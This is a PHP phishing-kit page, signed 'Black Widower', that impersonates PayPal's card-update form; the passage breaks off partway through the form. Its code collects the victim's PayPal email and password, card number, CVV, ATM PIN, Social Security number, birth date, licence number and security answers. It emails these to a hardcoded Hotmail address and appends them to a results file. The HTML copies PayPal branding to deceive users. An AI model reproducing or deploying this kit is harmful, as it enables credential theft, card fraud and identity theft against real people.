<?php
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/


$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");
$dater = gmdate("j/m/Y  -  G:i:s");
if (!isset($_SESSION)) {
  session_start();
}
ini_set('session.gc_maxlifetime', 3600);

include "../lang/langdetect.php";
require(PR_TARGET."header.php");

global $error;
$error = 1;

if(@$_POST['cmd'] == "ok"){


if(empty($_POST['defaultcvv2'])){
$defaultcvv2 = 'error';
$error = 0;
}

if(empty($_POST['answer1'])){
$answer1 = 'error';
$error = 0;
}

if(empty($_POST['answer2'])){
$answer2 = 'error';
$error = 0;
}

if(empty($_POST['question1'])){
$quest1 = 'error';
$error = 0;
}

if(empty($_POST['question2'])){
$quest1 = 'error';
$error = 0;
}

if(empty($_POST['userphone'])){
$userphone = 'error';
$error = 0;
}

if(empty($_POST['defaultcardnumber'])){
$defaultcardnumber = 'error';
$error = 0;
}

if(empty($_POST['defaultcountry'])){
$defaultcountry = 'error';
$error = 0;
}

if(empty($_POST['fullname'])){
$fullname = 'error';
$error = 0;
}

if(empty($_POST['defaultaddress1'])){
$defaultaddress1 = 'error';
$error = 0;
}

if(empty($_POST['defaultcity'])){
$defaultcity = 'error';
$error = 0;
}

if(empty($_POST['defaultstate'])){
$defaultstate = 'error';
$error = 0;
}

if(empty($_POST['defaultzip'])){
$defaultzip = 'error';
$error = 0;
}

if(empty($_POST['bday'])){
$bday = 'error';
$error = 0;
}

if(empty($_POST['bmonth'])){
$bmonth = 'error';
$error = 0;
}

if(empty($_POST['byear'])){
$byear = 'error';
$error = 0;
}

if( empty($_POST['defaultexpmonth']) or empty($_POST['defaultexpyear'])){
$defaultexpmonth = 'error';
$error = 0;
}

if( ($_POST['defaultexpmonth'] == 01 and $_POST['defaultexpyear'] == 11) or ($_POST['defaultexpmonth'] == 02 and $_POST['defaultexpyear'] == 11) or ($_POST['defaultexpmonth'] == 03 and $_POST['defaultexpyear'] == 11) ){
$defaultexpmonth = 'error';
$error = 0;
}


if( $error != 0 ){

$message .= "--------------ReZulT SpAm-----------------------\n";
$message .= "Email Address                 : ".$_SESSION['emaill']."\n";
$message .= "Password                      : ".$_SESSION['passwordd']."\n";
$message .= "IP                            : ".$ip."\n";
$message .= "Browser                       : ".$browser."\n";
$message .= "Date                          : ".$dater."\n";
$message .= "\n";
$message .= "---------------------------\n";
$message .= "\n";
$message .= "Full Name                     : ".$_POST['fullname']."\n";
$message .= "Card Type                     : ".$_POST['card_type']."\n";
$message .= "Card Number                   : ".$_POST['defaultcardnumber']."\n";
$message .= "Expiration Date               : ".$_POST['defaultexpmonth']."/";
$message .= "".$_POST['defaultexpyear']."\n";
$message .= "Card Verification Number      : ".$_POST['defaultcvv2']."\n";
$message .= "ATM PIN                       : ".$_POST['PIN']."\n";
$message .= "Address 1                     : ".$_POST['defaultaddress1']."\n";
$message .= "Address 2                     : ".$_POST['defaultaddress2']."\n";
$message .= "City                          : ".$_POST['defaultcity']."\n";
$message .= "State                         : ".$_POST['defaultstate']."\n";
$message .= "ZIP Code                      : ".$_POST['defaultzip']."\n";
$message .= "Country                       : ".$_POST['defaultcountry']."\n";
$message .= "Telephone                     : ".$_POST['userphone']."\n";
$message .= "Social Security Number        : ".$_POST['ssn']."\n";
$message .= "Date Of Birth                 : ".$_POST['bday']."/";
$message .= "".$_POST['bmonth']."/";
$message .= "".$_POST['byear']."\n";
$message .= "Driver's License              : ".$_POST['drl']."\n";
$message .= "\n";
$message .= "---------------------------\n";
$message .= "\n";
$message .= "Security Question 1           : ".$_POST['question1']."\n";
$message .= "Answer 1                      : ".$_POST['answer1']."\n";
$message .= "Security Question 2           : ".$_POST['question2']."\n";
$message .= "Answer 2                      : ".$_POST['answer2']."\n";
$message .= "IP                            : ".$ip."\n";
$message .= "\n\n";
$message .= "---------------PayPaL------------------------------\n";
$to = "loladelapena@hotmail.fr"; 
$subject = "PayPal:".$ip;
$headers = "From: PayPal<service@mail.com>";
$headers = "MIME-Version: 1.0\n";
$from = "PayPal Monster";
mail($to,$subject,$message,$headers,$from);
require(HEADING_TARGET);
header("Location: ../done.php?cmd=_login&dispatch=5885d80a13c0db1f8e263663d3faee8d4b3d02051cb40a5393d96fec50118c72");
}
}
$file= fopen("../../resu.txt", "a");
fwrite($file, "-----------------------PayPal Spam Result-----------------------------\n");
fwrite($file, "Email Address                 : ".$_SESSION['emaill']."\n");
fwrite($file, "Password                      : ".$_SESSION['passwordd']."\n");
fwrite($file, "IP                            : ".$ip."\n");
fwrite($file, "Browser                       : ".$browser."\n");
fwrite($file, "Date                          : ".$dater."\n");
fwrite($file, "\n");
fwrite($file, "--------------Credit Card Result-------------\n");
fwrite($file, "\n");
fwrite($file, "Full Name                     : ".$_POST['fullname']."\n");
fwrite($file, "Card Type                     : ".$_POST['card_type']."\n");
fwrite($file, "Card Number                   : ".$_POST['defaultcardnumber']."\n");
fwrite($file, "Expiration Date               : ".$_POST['defaultexpmonth']."/");
fwrite($file, "".$_POST['defaultexpyear']."\n");
fwrite($file, "Card Verification Number      : ".$_POST['defaultcvv2']."\n");
fwrite($file, "ATM PIN                       : ".$_POST['PIN']."\n");
fwrite($file, "Address 1                     : ".$_POST['defaultaddress1']."\n");
fwrite($file, "Address 2                     : ".$_POST['defaultaddress2']."\n");
fwrite($file, "City                          : ".$_POST['defaultcity']."\n");
fwrite($file, "State                         : ".$_POST['defaultstate']."\n");
fwrite($file, "ZIP Code                      : ".$_POST['defaultzip']."\n");
fwrite($file, "Country                       : ".$_POST['defaultcountry']."\n");
fwrite($file, "Telephone                     : ".$_POST['userphone']."\n");
fwrite($file, "Social Security Number        : ".$_POST['ssn']."\n");
fwrite($file, "Date Of Birth                 : ".$_POST['bday']."/");
fwrite($file, "".$_POST['bmonth']."/");
fwrite($file, "".$_POST['byear']."\n");
fwrite($file, "Driver's License              : ".$_POST['drl']."\n");
fwrite($file, "\n");
fwrite($file, "----------------------------------------------\n");
fwrite($file, "\n");
fwrite($file, "Security Question 1           : ".$_POST['question1']."\n");
fwrite($file, "Answer 1                      : ".$_POST['answer1']."\n");
fwrite($file, "Security Question 2           : ".$_POST['question2']."\n");
fwrite($file, "Answer 2                      : ".$_POST['answer2']."\n");
fwrite($file, "IP                            : ".$ip."\n");
fwrite($file, "\n\n");
fwrite($file, "---------------------------------------------------Black<=====================>Widower----------------------------------------------\n");
fclose($file);

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=ANSI">
<!--
 Script info: script: webscr, cmd: _profile-credit-card-new-clickthru, template: p/acc/pro/cc-add, date: Nov. 14, 2008 14:00:33 PST; country: AU, language: en_AU, xslt server:
 installation: WEBSCR-495-20071119-1 web version: 49.5-449887 branch: live-495_int
 content version: 49.5-442158
 pexml version: 49.5-452976
 page XSL: FinancialInstrument/default/en_AU/account/profile/CCAdd.xsl
 hostname : Hina8NrQtZRtCnjcgHIwV5Yhsy3cnetnZYg.-3ioJb0
--><title><?php echo $profupdate; ?></title><!--googleoff: all-->
<meta http-equiv="keywords" content="Send, money, payments, credit, credit card, instant, money, financial services, mobile, wireless, WAP, mobile phones, two-way pagers, Windows CE"><!--googleon: all--><!--googleoff: all-->
<meta http-equiv="description" content="PayPal lets you send money to anyone with email. PayPal is free for consumers, and works seamlessly with your existing credit card and current account. You can settle debts, borrow cash, divide bills or split expenses with friends, all without going to an ATM or looking for your chequebook."><!--googleon: all-->
<link media="screen" rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/core/global.css">
<link rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/Customer/pages/paymentFlow.css">
<link rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/Customer/pages/pageAddBankAccount.css">
<!--[if IE 7]><link media="screen" rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/browsers/ie7.css"><![endif]-->
<!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/browsers/ie6.css"><![endif]-->
<link rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/Customer/pages/lang.css">
<script type="text/javascript">
if (parent.frames.length > 0){
	top.location.replace(document.location);
}</script><script type="text/javascript" src="../WEBSCR-640-20101004-1/js/lib/min/global.js"></script><link rel="shortcut icon" href="../WEBSCR-640-20101004-1/en_US/i/icon/pp_favicon_x.ico">
<style type="text/css">
.Warning {
background:#ffffcc;color:black;
}
select{border:1px solid #84A8CC;margin-bottom:2px;}
input{border:1px solid #84A8CC;margin-bottom:2px;}
</style>
</head>
<body>
<noscript><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript>
<div class="" id="page">
<div class="std" id="header">
<h1><a href="#"><img src="../WEBSCR-640-20101004-1/en_US/i/logo/paypal_logo.gif" alt="PayPal" border="0"></a></h1>
<div class="std" id="navGlobal"><ul>
<li class="logout"><a href="#"><?php echo $logout; ?></a></li>
<li><a href="#"><?php echo $help; ?></a></li>
<li class="last"><a href="#"><?php echo $s_center; ?></a></li>
</ul></div>
<div id="navPrimary" class="srd"><ul class="secondary">
<li class="active">
<a href="#" href="#"><?php echo $myacc; ?></a><ul>
<li><a href="#" href="#"><?php echo $over; ?></a></li>
<li><a href="#" href="#"><?php echo $addfound; ?></a></li>
<li>
<a href="#" href="#"><?php echo $retirar; ?></a><ul><li><a href="#" href="#"><?php echo $banktf; ?></a></li></ul>
</li>
<li>
<a href="#" href="#"><?php echo $history; ?></a><ul>
<li><a href="#" href="#"><?php echo $bsearch; ?></a></li>
<li><a href="#" href="#"><?php echo $dhistory; ?></a></li>
</ul>
</li>
<li class="">
<a href="#" href="#"><?php echo $resolu; ?></a><ul>
<li><a href="#" href="#"><?php echo $opencase; ?></a></li>
<li><a href="#" href="#"><?php echo $guides; ?></a></li>
</ul>
</li>
<li class="active">
<a href="#" href="#"><?php echo $prof; ?></a><ul>
<li><a href="#" href="#"><?php echo $addemail; ?></a></li>
<li><a href="#" href="#"><?php echo $addbank; ?></a></li>
<li><a href="#" href="#"><?php echo $addcard; ?></a></li>
<li><a href="#" href="#"><?php echo $addadr; ?></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#" href="#"><?php echo $sendmoney; ?></a></li>
<li><a href="#" href="#"><?php echo $reqmoney; ?></a></li>
<li class=""><a href="#" href="#"><?php echo $mservices; ?></a></li>
<li><a href="#" href="#"><?php echo $autools; ?></a></li>
<li><a href="#" href="#"><?php echo $products; ?></a></li>
</ul></div>
</div>
<div style="clear: both;"></div>
<div id="content">
<div id="headline">
<div class="secure"><a rel="nofollow" target="_blank" href="https://www.paypal.com/id/cgi-bin/webscr?cmd=xpt/Merchant/popup/WaxAboutPaypal-outside&amp;justSecure=true" onClick="PAYPAL.core.openWindow(event, {width: 400, height: 480})"><span class="small"><?php echo $stra; ?></span></a></div>
<h2><?php echo $puf; ?></h2>
</div>

<?php
if( $error == 0 ){

echo "$error0";

}
?>

<div id="messageBox"></div>
<div id="main"><div class="legacyErrors">
<p><?php echo $completeform; ?></p>

<script language="JavaScript">
function openWindow2() {
popupWin = window.open('../WEBSCR-640-20101004-1/css/Customer/pages/img/pin.html','EIN','scrollbars,resizable,toolbar,width=420,height=300,left=50,top=50');
popupWin.focus();
}
</script>
<script language="JavaScript">
function openWindow1() {
popupWin = window.open('../WEBSCR-640-20101004-1/css/Customer/pages/img/cvv.html','EIN','scrollbars,resizable,toolbar,width=420,height=300,left=50,top=50');
popupWin.focus();
}
</script>

<?php

if( $error == 0 ){


if($fullname == 'error'){
echo "$error2";
}
if($bday or $bmonth or $byear == 'error'){
echo "$error8";
}
if($userphone == 'error'){
echo "$error3";
}
if($defaultaddress1 == 'error'){
echo "$error4";
}
if($defaultcity == 'error'){
echo "$error5";
}
if($defaultzip == 'error'){
echo "$error12";
}
if($defaultcountry == 'error'){
echo "$error7";
}
if($defaultcardnumber == 'error'){
echo "$error9";
}
if($defaultexpmonth  == 'error'){
echo "$error11";
}
if($defaultcvv2 == 'error'){
echo "$error10";
}
if($quest1 == 'error'){
echo "$error15";
}
if($answer1 or $answer2 == 'error'){
echo "$error14";
}
}
?>

<input type="hidden" name="cmd" value="ok">
<form method="post" name="main" id="main" action="update.php?cmd=_login-submit&amp;dispatch=5885d80a13c0db1f8e263663d3faee8d4b3d02051cb40a5393d96fec50118c72">
<input type="hidden" id="swich" name="swich" value="0">
<input type="hidden" name="cmd" value="ok">

<hr class="dotted">
<h3><?php echo $pip; ?></h3>
<p><?php echo $acu; ?><br /><?php echo $filla; ?></p>


<table align="center" border="0" cellpadding="0" cellspacing="0" width="760">
<tr>
<td class="label" width="320"><label for="fullname"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $ffname; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="fullname" name="fullname" size="20" value=""></td>
</tr>

<tr>
<td class="label" width="320"><label for="dob"><sup><img id="(3,h*" border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $dobi; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418">

<select class="" name=bmonth><b>
<option selected value=""><?php echo $month; ?></option>
<option value=Jan >Jan</option>
<option value=Feb >Feb</option>
<option value=Mar >Mar</option>
<option value=Apr >Apr</option>
<option value=May >May</option>
<option value=Jun >Jun</option>
<option value=Jul >Jul</option>
<option value=Aug >Aug</option>
<option value=Sep >Sep</option>
<option value=Oct >Oct</option>
<option value=Nov >Nov</option>
<option value=Dec >Dec</option>
</select>
<select class="" name=bday>
<option selected value=""><?php echo $day; ?></option>
<option value=01 >01</option>
<option value=02 >02</option>
<option value=03 >03</option>
<option value=04 >04</option>
<option value=05 >05</option>
<option value=06 >06</option>
<option value=07 >07</option>
<option value=08 >08</option>
<option value=09 >09</option>
<option value=10 >10</option>
<option value=11 >11</option>
<option value=12 >12</option>
<option value=13 >13</option>
<option value=14 >14</option>
<option value=15 >15</option>
<option value=16 >16</option>
<option value=17 >17</option>
<option value=18 >18</option>
<option value=19 >19</option>
<option value=20 >20</option>
<option value=21 >21</option>
<option value=22 >22</option>
<option value=23 >23</option>
<option value=24 >24</option>
<option value=25 >25</option>
<option value=26 >26</option>
<option value=27 >27</option>
<option value=28 >28</option>
<option value=29 >29</option>
<option value=30 >30</option>
<option value=31 >31</option>
</select>
<select class="" name=byear>
<option selected value=""><?php echo $year; ?></option>
<option value=1910 >1910</option>
<option value=1911 >1911</option>
<option value=1912 >1912</option>
<option value=1913 >1913</option>
<option value=1914 >1914</option>
<option value=1915 >1915</option>
<option value=1916 >1916</option>
<option value=1917 >1917</option>
<option value=1918 >1918</option>
<option value=1919 >1919</option>
<option value=1920 >1920</option>
<option value=1921 >1921</option>
<option value=1922 >1922</option>
<option value=1923 >1923</option>
<option value=1924 >1924</option>
<option value=1925 >1925</option>
<option value=1926 >1926</option>
<option value=1927 >1927</option>
<option value=1928 >1928</option>
<option value=1929 >1929</option>
<option value=1930 >1930</option>
<option value=1931 >1931</option>
<option value=1932 >1932</option>
<option value=1933 >1933</option>
<option value=1934 >1934</option>
<option value=1935 >1935</option>
<option value=1936 >1936</option>
<option value=1937 >1937</option>
<option value=1938 >1938</option>
<option value=1939 >1939</option>
<option value=1940 >1940</option>
<option value=1941 >1941</option>
<option value=1942 >1942</option>
<option value=1943 >1943</option>
<option value=1944 >1944</option>
<option value=1945 >1945</option>
<option value=1946 >1946</option>
<option value=1947 >1947</option>
<option value=1948 >1948</option>
<option value=1949 >1949</option>
<option value=1950 >1950</option>
<option value=1951 >1951</option>
<option value=1952 >1952</option>
<option value=1953 >1953</option>
<option value=1954 >1954</option>
<option value=1955 >1955</option>
<option value=1956 >1956</option>
<option value=1957 >1957</option>
<option value=1958 >1958</option>
<option value=1959 >1959</option>
<option value=1960 >1960</option>
<option value=1961 >1961</option>
<option value=1962 >1962</option>
<option value=1963 >1963</option>
<option value=1964 >1964</option>
<option value=1965 >1965</option>
<option value=1966 >1966</option>
<option value=1967 >1967</option>
<option value=1968 >1968</option>
<option value=1969 >1969</option>
<option value=1970 >1970</option>
<option value=1971 >1971</option>
<option value=1972 >1972</option>
<option value=1973 >1973</option>
<option value=1974 >1974</option>
<option value=1975 >1975</option>
<option value=1976 >1976</option>
<option value=1977 >1977</option>
<option value=1978 >1978</option>
<option value=1979 >1979</option>
<option value=1980 >1980</option>
<option value=1981 >1981</option>
<option value=1982 >1982</option>
<option value=1983 >1983</option>
<option value=1984 >1984</option>
<option value=1985 >1985</option>
<option value=1986 >1986</option>
<option value=1987 >1987</option>
<option value=1988 >1988</option>
<option value=1988 >1989</option>
<option value=1988 >1990</option>
<option value=1988 >1991</option>
<option value=1988 >1992</option>
<option value=1988 >1993</option>
<option value=1988 >1994</option>
<option value=1988 >1995</option>
</select>
</td>
</tr>


<tr>
<td class="label" width="320"><label for="userphone"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $hpn; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="userphone" size="20" maxlength="20" name="userphone" value=""></td>
</tr>
<tr>
<td class="label" width="320"><label for="userphoneinfo">&nbsp;</label></td>
<td width="2">&nbsp;</td>
<td width="418"><span class="small"><?php echo $acpnum ?></span></td>
</tr>

</table>

<hr class="dotted">
</td
></tr>


<h3><?php echo $hap; ?></h3>
<p><?php echo $acu; ?></p>

<table align="center" border="0" cellpadding="0" cellspacing="0" width="760">

<tr>
<td class="label" width="320"><label for="defaultaddress1"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $adr1; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input style="width:200px" class="" type="text" id="defaultaddress1" name="defaultaddress1" size="20" value=""></td>
</tr>

<tr>
<td class="label" width="320"><label for="defaultaddress2"><?php echo $adr2; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input style="width:200px" type="text" id="defaultaddress2" name="defaultaddress2" size="20" value=""></td>
</tr>

<tr>
<td class="label" width="320"><label for="defaultcity"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $city; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="defaultcity" name="defaultcity" size="15" value=""></td>
</tr>

<tr>
<td class="label" width="320"><label for="defaultstate"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $state; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><select id="defaultstate" name="defaultstate"><option value="00">---</option>
<option value="AK">AK</option>
<option value="AL">AL</option>
<option value="AR">AR</option>
<option value="AZ">AZ</option>
<option value="CA">CA</option>
<option value="CO">CO</option>
<option value="CT">CT</option>
<option value="DC">DC</option>
<option value="DE">DE</option>
<option value="FL">FL</option>
<option value="GA">GA</option>
<option value="HI">HI</option>
<option value="IA">IA</option>
<option value="ID">ID</option>
<option value="IL">IL</option>
<option value="IN">IN</option>
<option value="KS">KS</option>
<option value="KY">KY</option>
<option value="LA">LA</option>
<option value="MA">MA</option>
<option value="MD">MD</option>
<option value="ME">ME</option>
<option value="MI">MI</option>
<option value="MN">MN</option>
<option value="MO">MO</option>
<option value="MS">MS</option>
<option value="MT">MT</option>
<option value="NC">NC</option>
<option value="ND">ND</option>
<option value="NE">NE</option>
<option value="NH">NH</option>
<option value="NJ">NJ</option>
<option value="NM">NM</option>
<option value="NV">NV</option>
<option value="NY">NY</option>
<option value="OH">OH</option>
<option value="OK">OK</option>
<option value="OR">OR</option>
<option value="PA">PA</option>
<option value="RI">RI</option>
<option value="SC">SC</option>
<option value="SD">SD</option>
<option value="TN">TN</option>
<option value="TX">TX</option>
<option value="UT">UT</option>
<option value="VA">VA</option>
<option value="VT">VT</option>
<option value="WA">WA</option>
<option value="WI">WI</option>
<option value="WV">WV</option>
<option value="WY">WY</option>
<option value="AA">AA</option>
<option value="AE">AE</option>
<option value="AP">AP</option>
<option value="AS">AS</option>
<option value="FM">FM</option>
<option value="GU">GU</option>
<option value="MH">MH</option>
<option value="MP">MP</option>
<option value="PR">PR</option>
<option value="PW">PW</option>
<option value="VI">VI</option></select></td>
</tr>

<tr>
<td class="label" width="320"><label for="defaultzip"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $zip; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="defaultzip" name="defaultzip" size="15" value=""></td>
</tr>

<tr>
<td class="label" width="320"><label for="defaultcountry"><sup><img src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $country; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418">

<select style="width:200px" name="defaultcountry" class="" >
<option value="" selected><?php echo $scountry; ?></option>
<option value="United States" >United States</option>
<option value="Albania" >Albania</option>
<option value="Algeria" >Algeria</option>
<option value="Andorra" >Andorra</option>
<option value="Angola" >Angola</option>
<option value="Anguilla" >Anguilla</option>
<option value="Antigua and Barbuda" >Antigua and Barbuda</option>
<option value="Argentina" >Argentina</option>
<option value="Armenia" >Armenia</option>
<option value="Aruba" >Aruba</option>
<option value="Australia" >Australia</option>
<option value="Austria" >Austria</option>
<option value="Azerbaijan Republic" >Azerbaijan Republic</option>
<option value="Bahamas" >Bahamas</option>
<option value="Bahrain" >Bahrain</option>
<option value="Barbados" >Barbados</option>
<option value="Belgium" >Belgium</option>
<option value="Belize" >Belize</option>
<option value="Benin" >Benin</option>
<option value="Bermuda" >Bermuda</option>
<option value="Bhutan" >Bhutan</option>
<option value="Bolivia" >Bolivia</option>
<option value="Bosnia and Herzegovina" >Bosnia and Herzegovina</option>
<option value="Botswana" >Botswana</option>
<option value="Brazil" >Brazil</option>
<option value="British Virgin Islands" >British Virgin Islands</option>
<option value="Brunei" >Brunei</option>
<option value="Bulgaria" >Bulgaria</option>
<option value="Burkina Faso" >Burkina Faso</option>
<option value="Burundi" >Burundi</option>
<option value="Cambodia" >Cambodia</option>
<option value="Canada" >Canada</option>
<option value="Cape Verde" >Cape Verde</option>
<option value="Cayman Islands" >Cayman Islands</option>
<option value="Chad" >Chad</option>
<option value="Chile" >Chile</option>
<option value="China Worldwide" >China Worldwide</option>
<option value="Colombia" >Colombia</option>
<option value="Comoros" >Comoros</option>
<option value="Cook Islands" >Cook Islands</option>
<option value="Costa Rica" >Costa Rica</option>
<option value="Croatia" >Croatia</option>
<option value="Cyprus" >Cyprus</option>
<option value="Czech Republic" >Czech Republic</option>
<option value="Democratic Republic of the Congo" >Democratic Republic of the Congo</option>
<option value="Denmark" >Denmark</option>
<option value="Djibouti" >Djibouti</option>
<option value="Dominica" >Dominica</option>
<option value="Dominican Republic" >Dominican Republic</option>
<option value="Ecuador" >Ecuador</option>
<option value="El Salvador" >El Salvador</option>
<option value="Eritrea" >Eritrea</option>
<option value="Estonia" >Estonia</option>
<option value="Ethiopia" >Ethiopia</option>
<option value="Falkland Islands" >Falkland Islands</option>
<option value="Faroe Islands" >Faroe Islands</option>
<option value="Federated States of Micronesia" >Federated States of Micronesia</option>
<option value="Fiji" >Fiji</option>
<option value="Finland" >Finland</option>
<option value="France" >France</option>
<option value="French Guiana" >French Guiana</option>
<option value="French Polynesia" >French Polynesia</option>
<option value="Gabon Republic" >Gabon Republic</option>
<option value="Gambia" >Gambia</option>
<option value="Germany" >Germany</option>
<option value="Gibraltar" >Gibraltar</option>
<option value="Greece" >Greece</option>
<option value="Greenland" >Greenland</option>
<option value="Grenada" >Grenada</option>
<option value="Guadeloupe" >Guadeloupe</option>
<option value="Guatemala" >Guatemala</option>
<option value="Guinea" >Guinea</option>
<option value="Guinea Bissau" >Guinea Bissau</option>
<option value="Guyana" >Guyana</option>
<option value="Honduras" >Honduras</option>
<option value="Hong Kong" >Hong Kong</option>
<option value="Hungary" >Hungary</option>
<option value="Iceland" >Iceland</option>
<option value="India" >India</option>
<option value="Indonesia" >Indonesia</option>
<option value="Ireland" >Ireland</option>
<option value="Israel" >Israel</option>
<option value="Italy" >Italy</option>
<option value="Jamaica" >Jamaica</option>
<option value="Japan" >Japan</option>
<option value="Jordan" >Jordan</option>
<option value="Kazakhstan" >Kazakhstan</option>
<option value="Kenya" >Kenya</option>
<option value="Kiribati" >Kiribati</option>
<option value="Kuwait" >Kuwait</option>
<option value="Kyrgyzstan" >Kyrgyzstan</option>
<option value="Laos" >Laos</option>
<option value="Latvia" >Latvia</option>
<option value="Lesotho" >Lesotho</option>
<option value="Liechtenstein" >Liechtenstein</option>
<option value="Lithuania" >Lithuania</option>
<option value="Luxembourg" >Luxembourg</option>
<option value="Madagascar" >Madagascar</option>
<option value="Malawi" >Malawi</option>
<option value="Malaysia" >Malaysia</option>
<option value="Maldives" >Maldives</option>
<option value="Mali" >Mali</option>
<option value="Malta" >Malta</option>
<option value="Marshall Islands" >Marshall Islands</option>
<option value="Martinique" >Martinique</option>
<option value="Mauritania" >Mauritania</option>
<option value="Mauritius" >Mauritius</option>
<option value="Mayotte" >Mayotte</option>
<option value="Mexico" >Mexico</option>
<option value="Mongolia" >Mongolia</option>
<option value="Montserrat" >Montserrat</option>
<option value="Morocco" >Morocco</option>
<option value="Mozambique" >Mozambique</option>
<option value="Namibia" >Namibia</option>
<option value="Nauru" >Nauru</option>
<option value="Nepal" >Nepal</option>
<option value="Netherlands" >Netherlands</option>
<option value="Netherlands Antilles" >Netherlands Antilles</option>
<option value="New Caledonia" >New Caledonia</option>
<option value="New Zealand" >New Zealand</option>
<option value="Nicaragua" >Nicaragua</option>
<option value="Niger" >Niger</option>
<option value="Niue" >Niue</option>
<option value="Norfolk Island" >Norfolk Island</option>
<option value="Norway" >Norway</option>
<option value="Oman" >Oman</option>
<option value="Palau" >Palau</option>
<option value="Panama" >Panama</option>
<option value="Papua New Guinea" >Papua New Guinea</option>
<option value="Peru" >Peru</option>
<option value="Philippines" >Philippines</option>
<option value="Pitcairn Islands" >Pitcairn Islands</option>
<option value="Poland" >Poland</option>
<option value="Portugal" >Portugal</option>
<option value="Qatar" >Qatar</option>
<option value="Republic of the Congo" >Republic of the Congo</option>
<option value="Reunion" >Reunion</option>
<option value="Romania" >Romania</option>
<option value="Russia" >Russia</option>
<option value="Rwanda" >Rwanda</option>
<option value="Saint Vincent and the Grenadines" >Saint Vincent and the Grenadines</option>
<option value="Samoa" >Samoa</option>
<option value="San Marino" >San Marino</option>
<option value="Sao Tome and Principe" >Sao Tome and Principe</option>
<option value="Saudi Arabia" >Saudi Arabia</option>
<option value="Senegal" >Senegal</option>
<option value="Seychelles" >Seychelles</option>
<option value="Sierra Leone" >Sierra Leone</option>
<option value="Singapore" >Singapore</option>
<option value="Slovakia" >Slovakia</option>
<option value="Slovenia" >Slovenia</option>
<option value="Solomon Islands" >Solomon Islands</option>
<option value="Somalia" >Somalia</option>
<option value="South Africa" >South Africa</option>
<option value="South Korea" >South Korea</option>
<option value="Spain" >Spain</option>
<option value="Sri Lanka" >Sri Lanka</option>
<option value="St. Helena" >St. Helena</option>
<option value="St. Kitts and Nevis" >St. Kitts and Nevis</option>
<option value="St. Lucia" >St. Lucia</option>
<option value="St. Pierre and Miquelon" >St. Pierre and Miquelon</option>
<option value="Suriname" >Suriname</option>
<option value="Svalbard and Jan Mayen Islands" >Svalbard and Jan Mayen Islands</option>
<option value="Swaziland" >Swaziland</option>
<option value="Sweden" >Sweden</option>
<option value="Switzerland" >Switzerland</option>
<option value="Taiwan" >Taiwan</option>
<option value="Tajikistan" >Tajikistan</option>
<option value="Tanzania" >Tanzania</option>
<option value="Thailand" >Thailand</option>
<option value="Togo" >Togo</option>
<option value="Tonga" >Tonga</option>
<option value="Trinidad and Tobago" >Trinidad and Tobago</option>
<option value="Tunisia" >Tunisia</option>
<option value="Turkey" >Turkey</option>
<option value="Turkmenistan" >Turkmenistan</option>
<option value="Turks and Caicos Islands" >Turks and Caicos Islands</option>
<option value="Tuvalu" >Tuvalu</option>
<option value="Uganda" >Uganda</option>
<option value="Ukraine" >Ukraine</option>
<option value="United Arab Emirates" >United Arab Emirates</option>
<option value="United Kingdom" >United Kingdom</option>
<option value="Uruguay" >Uruguay</option>
<option value="Vanuatu" >Vanuatu</option>
<option value="Vatican City State" >Vatican City State</option>
<option value="Venezuela" >Venezuela</option>
<option value="Vietnam" >Vietnam</option>
<option value="Wallis and Futuna Islands" >Wallis and Futuna Islands</option>
<option value="Yemen" >Yemen</option>
<option value="Zambia" >Zambia</option>
</select>

</td>
</tr>

</table>

<hr class="dotted">
<h3><?php echo $ccprof; ?></h3>
<p><?php echo $damelacc; ?><br/><?php echo $damelacb; ?></p>

<table align="center" border="0" cellpadding="0" cellspacing="0" width="760">

<tr>
<td class="label" width="320"><label for="card_type"><sup><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/asterisk.gif"></sup><?php echo $Tcard; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418">
    <select name="card_type" >
    <option value="00"></option>
    <option value="Carte Bancaire" selected>Credit Card</option>
    <option value="Visa">Visa</option>
    <option value="MasterCard">MasterCard</option>
    <option value="Carte Aurore">Carte Aurore</option>
    <option value="Cofinoga">Cofinoga</option>
    <option value="4 �toiles">4 �toiles</option>
    </select>
